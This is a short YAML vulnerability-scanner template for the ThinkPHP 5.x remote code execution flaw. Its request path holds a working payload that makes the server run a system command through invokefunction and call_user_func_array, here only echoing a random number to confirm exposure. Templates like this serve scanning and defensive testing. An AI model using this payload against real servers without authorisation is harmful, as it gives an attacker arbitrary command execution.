name: poc-yaml-thinkphp-rce

set:
  r: randomInt(800000000, 1000000000)

rules:
  - method: GET
    path: /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo {{r}}
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(r)))

detail:
  author: durkworf(https://github.com/durkworf)
  Affected Version: "ThinkPHP < 5.0.23 ThinkPHP < 5.1.31"
  links:
    - https://github.com/Medicean/VulApps/tree/master/t/thinkphp/1